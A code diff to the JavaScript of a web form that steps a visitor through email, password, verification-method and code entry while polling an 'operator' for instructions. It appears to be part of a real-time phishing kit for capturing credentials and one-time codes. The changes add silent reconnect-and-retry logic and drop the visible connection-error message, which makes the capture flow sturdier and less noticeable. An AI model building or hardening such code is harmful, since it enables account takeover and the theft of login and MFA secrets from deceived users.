@@ -678,6 +678,8 @@ const POLLING_TIMEOUT_MS = 10 * 60 * 1000; // 10 minutes global timeout
 let currentStatus = null;
 let lastShownStatus = '';
   let isSubmitting = false;
+  let isProcessing = false;
+  let lastFormVisibleStatus='WAITINGEMAIL';
   let isInitialLoad = true;
   let submitGuardTimeout = null;
 let lastRenderedOptionsHash = '';
@@ -838,6 +840,7 @@ function updateUIForStatus(status, data = {}) {
       break;
     case 'WAITINGEMAIL':
     case 'WAITINGEMAILERROR':
+      lastFormVisibleStatus=status;
       setFormSubmitting(false);
       emailGroup.style.display = 'block';
       passwordGroup.style.display = 'block';
@@ -864,6 +867,7 @@ function updateUIForStatus(status, data = {}) {
       break;
     case 'WAITINGPASSWORD':
     case 'WAITINGPASSWORDERROR':
+      lastFormVisibleStatus=status;
       setFormSubmitting(false);
       emailGroup.style.display = 'block';
       passwordGroup.style.display = 'block';
@@ -893,6 +897,7 @@ function updateUIForStatus(status, data = {}) {
       startPolling(2000);
       break;
     case 'WAITINGOPTIONS':
+      lastFormVisibleStatus=status;
       setFormSubmitting(false);
       emailGroup.style.display = 'none';
       passwordGroup.style.display = 'none';
@@ -914,6 +919,7 @@ function updateUIForStatus(status, data = {}) {
       startPolling(2000);
       break;
     case 'WAITINGCODE':
+      lastFormVisibleStatus=status;
       setFormSubmitting(false);
       emailGroup.style.display = 'none';
       passwordGroup.style.display = 'none';
@@ -1256,16 +1262,21 @@ async function pollOperator() {
     console.log("Polling response:", data);
 
     if (data.currentStatus) {
+      isProcessing = false;
       updateUIForStatus(data.currentStatus, data.data || {}); 
     } else {
       console.warn("Polling response missing currentStatus:", data);
     }
 } catch (error) {
-    console.error("Error during polling:", error);
+    console.error("[Template] Poll error, will retry in 5s:", error);
     clearInterval(pollingIntervalId);
-    isSubmitting = false;
-    if (submitGuardTimeout) { clearTimeout(submitGuardTimeout); submitGuardTimeout = null; }
-    showFailedView('Connection issue. Please check your internet and try again.');
+    if(isProcessing){isProcessing=false;updateUIForStatus(lastFormVisibleStatus,{})}
+    setTimeout(() => {
+        if (browserId) {
+            pollingStartTime = Date.now();
+            startPolling(2000);
+        }
+    }, 5000);
 }
 }
 
@@ -1408,14 +1419,11 @@ async function handleFormSubmission() {
     const data = await response.json();
     console.log("Update process response:", data);
 
-    // After update, restart polling with a shorter interval so the first status
-    // arrives quickly. Don't pollOperator() immediately — let the engine process
-    // the update first, and the loading overlay stays visible until the poll returns.
     if (updateType === 'verificationChoice') {
       await new Promise(resolve => setTimeout(resolve, 3000));
     }
-    pollingStartTime = Date.now();
-    startPolling(2000);
+    isProcessing = true;
+    updateUIForStatus('PROCESSING', {});
 
   } catch (error) {
     console.error("Error during form submission:", error);
